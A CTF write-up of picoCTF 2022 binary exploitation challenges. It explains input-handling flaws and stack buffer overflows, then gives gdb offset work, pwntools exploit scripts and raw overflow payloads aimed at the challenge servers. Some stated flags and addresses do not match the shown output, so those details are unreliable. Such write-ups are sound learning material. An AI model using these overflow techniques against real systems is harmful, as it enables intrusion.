# **Binary Exploitation**
- [x] [basic-file-exploit (100)](#basic-file-exploit)
- [x] [buffer overflow 0 (100)](#buffer-overflow-0)
- [x] [CVE-XXXX-XXXX (100)](#cve-xxxx-xxxx)
- [x] [buffer overflow 1 (200)](#buffer-overflow-1)
- [ ] x-sixty-what
- [x] [RPS (200)](#rps)
- [x] [buffer overflow 2 (300)](#buffer-overflow-2)
- [ ] buffer overflow 3
- [ ] flag leak
- [ ] ropfu
- [ ] wine
- [ ] function overwrite
- [ ] stack cache
- [ ] solfire

## **basic-file-exploit**

### ***Description***
The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! <br>Connect to the program with netcat: <br>
`$ nc saturn.picoctf.net 49698` <br>
The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/538/program-redacted.c).

<details>
    <summary>Hint 1</summary>
    Try passing in things the program doesn't expect. Like a string instead of a number.
</details>

### ***Writeup***
Look through the source code, I notice that there is a global character pointer `flag` that is redacted, and that in the `data_read()` function there is this:

```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
}
```

The function puts the flag onto the console if `entry_number==0`, or when the `strtol` function return 0. Looking at the man pages, it seems the function returns 0 when there is an error, most  likely when the function is unable to convert the string to a long. Therefore, the value of `entry` needs to be something that cannot be converted to a long, and the easiest one to use is a letter.

Make sure that the program jumps to `data_read()` by making sure `inputs==0` is not satisfied, which can be incremented by calling `data_write()` by choosing option 1 first. 

Code for `basic-file-exploit.py`:

```python
from pwn import *

p = remote('saturn.picoctf.net', 49698)

p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'2')
p.sendline(b'A')

for i in range(3):
        print(p.recvline())
```

Terminal output:

```bash
└─$ python3 basic-file-exploit.py
[+] Opening connection to saturn.picoctf.net on port 49698: Done
b'\r\n'
b'A\r\n'
b'picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}\r\n'
[*] Closed connection to saturn.picoctf.net port 49698
```

Flag: `picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_25D6CDDB}`

## **buffer overflow 0**

### ***Description***
Smash the stack <br>
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: <br>
`nc saturn.picoctf.net 64712`

<details>
    <summary>Hint 1</summary>
    How can you trigger the flag to print?
</details>
<details>
    <summary>Hint 2</summary>
    If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
</details>
<details>
    <summary>Hint 3</summary>
    Run `man gets` and read the BUGS section. How many characters can the program really read?
</details>

### ***Writeup***
If you cannot run the vuln executable, it might be because your OS does not support 32-bit programs. I recommend either [installing gcc-multilib](https://superuser.com/a/1603878) to install libc6 to run a 32-bit ELF on a 64-bit architecture (`sudo apt install gcc-multilib`), or use the gcc compiler and compile the C code (`gcc vuln.c -o vuln`).

Looking at the vuln code, I can see that it first takes the contents of `flag.txt` and copies it to the global buffer `flag` using `fgets`. It then takes user input and writes it to `buf1` which is of size 100. Then, it calls the `vuln` void function which will use `strcpy` and copy the contents of `buf1` to `buf2` which is of size 16 using `gets`.

The error here is the vulnerable `strcpy` function, because it will write all the bytes from the input to the destination, and it can even write past the buffer into other parts of the memory.

It also seems the program will not allow the user to progress if `flag.txt` does not exist, so create the file using `touch flag.txt`.

I am going to send 4 A's to the vuln program to see what happens.

```bash
└─$ ./vuln
Input: AAAA
The program will exit now
```

As expected, nothing much and the program exits nicely. Looking at the code carefully, it seems there is a segmentation fault signal handler that will catch if a seg fault happens. Specifically, if the program catches that signal, it goes to the `sigsegv_handler` function that will handle the signal by printing the `flag` buffer and then exit the program. Therefore, the goal is to get the program to seg fault, and one way to do that is to write into the return address and corrupt it so that the program doesn't know where to jump to in memory after it exits the vuln function.

Run `gdb vuln` and then `layout asm` to get the assembly. You can also toggle the tui with <kbd>Ctrl+X+A</kbd>.

Since `strcpy` is in the vuln function, I am going to analyze the assembly at that section by doing `disas vuln`. I set a breakpoint after the `strcpy()`  call by doing `b *vuln+38` so I can analyze the stack after the program copies from `input` to `buf2`. Run with `r` and give an input of 4 A's, and the program should stop at the first breakpoint after the `strcpy()`. Examine the stack with `x/20x $esp`.

![buf2_start](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_0\buf2_start.png)

I can see that `buf2` starts at address `0xffffcfc0` on the stack because that's where the `0x41` starts to appear. Running `info frame` next shows the following:

![ebx](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_0\ebx.png)

The saved register `ebx` highlighted is `0xffffcfd4`, which is where `ebx` is on the stack. The value of register `ebx` is `0x56558fac`, which looks like an important register that should not be changed (I think it points to approximately to where `strcpy` is and loaded). We can do some offset calculation in gdb to find how many A's we need to get that register corrupt.

```bash
(gdb) p 0xffffcfd4 - 0xffffcfc0
$2 = 20
```

I am going to try and corrupt ebx register and possibly create a segmentation fault, I will write 20 A's into `input.txt` by doing `python3 -c "print('A'*20)" > input.txt` and then use that payload for gdb.

This is what the stack looks like with the payload. Reason why the address at `0xffffcfd4` was changed was because the payload was 20 A's including the null byte, where the null byte wrote into the next address.

![new_stack](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_0\new_stack)

And then stepping through gdb shows that it tries to load in the address at `0xffffcfd4` on the stack into `eip`, and since that is not a valid memory address it triggers the segmentation fault.

![segfault](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_0\segfault.png)

If you look at `vuln+8`, the program allocates `0x14`, or in decimal 20 bytes for `buf2`. Even though `buf2` was created on the stack with a size of 16, it needs the null byte. Of the 20 bytes, 16 is for the buffer, one is for the null byte, and last 3 is for the padding to make everything aligned to 32-bits (since this is a 32-bit program).

```bash
└─$ python3 -c "print('A'*20)" | nc saturn.picoctf.net 64712
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_81929e72}
```

Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_81929e72}`

## **CVE-XXXX-XXXX**

### ***Description***
Enter the CVE of the vulnerability as the flag with the correct flag format: <br>
`picoCTF{CVE-XXXX-XXXXX}` replacing XXXX-XXXXX with the numbers for the matching vulnerability. <br>
The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.

<details>
    <summary>Hint 1</summary>
    We're not looking for the Local Spooler vulnerability in 2021...
</details>

### ***Writeup***
A quick Google search of "first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service" gives this [result](https://msrc.microsoft.com/update-guide/vulnerability/cve-2021-34527). Make sure that the Attack Vector is Network and not Local.

Flag: `picoCTF{CVE-2021-34527}`

## **buffer overflow 1**

### ***Description***
<button name="button" onclick="http://www.google.com">Launch Instance</button> <br>
Control the return address <br>
Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/253/vuln). <br>
You can view source [here](https://artifacts.picoctf.net/c/253/vuln.c). And connect with it using `nc saturn.picoctf.net 59771`

<details>
    <summary>Hint 1</summary>
    Make sure you consider big Endian vs small Endian.
</details>
<details>
    <summary>Hint 2</summary>
    Changing the address of the return pointer can call different functions.
</details>

### ***Writeup***
Looking at the source code in `vuln.c`, it seems that after calling the print function in the `main()` function, it jumps to the `vuln()` function and takes user input using `gets()` and stores it in the local character buffer `buf` of size 32. It also prints the return address of the `vuln()` function, which is `0x804932f`

```bash
└─$ ./vuln
Please enter your string:
AAAA
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

There is also another function `win()` in the code that does not seem to be called anywhere in the program. The function seems to print the contents of `flag.txt`, which is what we are trying to achieve. Therefore, the goal is to change the return address so that in `vuln()` it does not jump back to `main()`, but to the  `win()` function.

Running `p win` in gdb shows that the function address is `0x80491f6`.

Set a breakpoint at `vuln+34` right after the `gets()` function is called. Run the program and give a test string of `AAAA`. Use `layout reg` to see the registers.

Running `info frame` shows that the saved eip value is `0xffffd04c`, which is where the return address is on the stack. Also running `x/20x $esp` shows that the start of `buf` is at `0xffffd020`, as indicated by the start of the `0x41`'s, or A in hex. We can use those numbers to calculate the offset between the start of the buffer to the return address, so we know how much padding we need before we add the new return address bytes to our payload.

Return address:

![eip](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_1\eip.png)

Start of buffer:

![buf_start](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_1\buf_start.png)

Make sure that when sending the payload that the address of `win()` is in little endian.

To check if it works, set another breakpoint at `win` and step through with `n`. I also created an `input.txt` file with the payload as well (refer to commented section in code). Therefore, running `r < input` in gdb and stepping shows the following modified stack:

![new_stack](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_1\new_stack.png) 

I also did end up in the `win()` function, and the value of `eip` did change to `0x80491f6`.

![win](C:\Users\jason\Documents\GitHub\picoCTF_2022\Binary_Exploitation\buffer_overflow_1\win.png)

Running the payload locally gives a message that it needs `flag.txt` to be in the directory, but looking at the source code the line right after that if condition is where `buf` which contains flag gets printed.

```python
└─$ ./vuln < input.txt
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.
```

Code for `buffer_overflow_1.py`:

```python
from pwn import *

p = remote('saturn.picoctf.net', 59771)

print(p.recvline())

offset = 0xffffd0bc - 0xffffd090
payload = bytearray(b'A'*offset)
payload.extend((0x80491f6).to_bytes(4, byteorder='little'))

#f = open("input.txt", "wb")
#f.write(payload)
#f.close()

p.sendline(payload)

print(p.recvline())
print(p.recv())
```

Terminal output:

```bash
└─$ python3 buffer_overflow_1.py
[+] Opening connection to saturn.picoctf.net on port 59771: Done
b'Please enter your string: \n'
b'Okay, time to return... Fingers Crossed... Jumping to 0x80491f6\n'
b'picoCTF{addr3ss3s_ar3_3asy_ad2f467b}'
[*] Closed connection to saturn.picoctf.net port 59771
```

Flag: `picoCTF{addr3ss3s_ar3_3asy_b9797671}`

## **RPS**

### ***Description***
Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row. <br>
Connect to the program with netcat: <br>
`$ nc saturn.picoctf.net 51420` <br>
The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/445/game-redacted.c).

<details>
    <summary>Hint 1</summary>
    How does the program check if you won?
</details>

### ***Writeup***
Looking at the source code, I need `wins` to be greater than 5 for the program to print the flag to the console. The `wins` variable is accumulated if `play()` returns true, which is if `strstr(player_turn, loses[computer_turn])` also returns a non-zero result. Looking at the man pages for `strstr` shows that it is in the form of `char *strstr(const char *haystack, const char *needle)`, where `strstr()` finds the first occurrence of the substring `needle` in the string `haystack`. It then returns a pointer to the beginning of the located substring. Therefore, the program tries to find the specific string of `loses[computer_turn]` in the `player_turn` string that we provided to the program, where `char* loses[3] = {"paper", "scissors", "rock"};`. Essentially, create a string where if `strstr` tries to find the substring match it succeeds on all occurrences, so such a string that does that is `rockpaperscissors` because each choice is a substring in that input string.

Code for `RPS.py`:

```python
from pwn import *

p = remote('saturn.picoctf.net', 51420)

for i in range(5):
        p.sendline(b'1')
        p.sendline(b'rockpaperscissors')

for i in range(6):
        print(p.recvline())
```

Terminal output:

```bash
└─$ python3 RPS.py
[+] Opening connection to saturn.picoctf.net on port 51420: Done
b'rockpaperscissors\r\n'
b'You played: rockpaperscissors\r\n'
b'The computer played: scissors\r\n'
b'You win! Play again?\r\n'
b"Congrats, here's the flag!\r\n"
b'picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}\r\n'
[*] Closed connection to saturn.picoctf.net port 51420
```

Flag: `picoCTF{50M3_3X7R3M3_1UCK_D80B11AA}`

## **buffer overflow 2**

### ***Description***

<button name="button" onclick="http://www.google.com">Launch Instance</button> <br>
Control the return address and arguments<br>
This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/344/vuln)?<br>
You can view source [here](https://artifacts.picoctf.net/c/344/vuln.c). And connect with it using `nc saturn.picoctf.net 60855`

### ***Writeup***

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'\x41'*112+b'\x96\x92\x04\x08'+b'\x00'*4+b'\x0d\xf0\xfe\xca'+b'\x0d\xf0\x0d\xf0'+b'\x0a')" > input.txt ; nc saturn.picoctf.net 61605 < input.txt
```

```python
from pwn import *

p = remote('saturn.picoctf.net', 60855)

print(p.recvline())

offset = 112
payload = bytearray(b'A'*offset)
payload.extend((0x8049296).to_bytes(4, byteorder='little'))
payload.extend(b'A'*4)
payload.extend((0xcafef00d).to_bytes(4, byteorder='little'))
payload.extend((0xf00df00d).to_bytes(4, byteorder='little'))

#f = open("input.txt", "wb")
#f.write(payload)
#f.close()

p.sendline(payload)

print(p.recvline())
print(p.recv())
```

```bash
└─$ python3 buffer_overflow_2.py
[+] Opening connection to saturn.picoctf.net on port 60855: Done
b'Please enter your string: \n'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08AAAA\r\xf0\xfe\xca\r\xf0\r\xf0\n'
b'picoCTF{argum3nt5_4_d4yZ_b3fd8f66}'
[*] Closed connection to saturn.picoctf.net port 60855
```

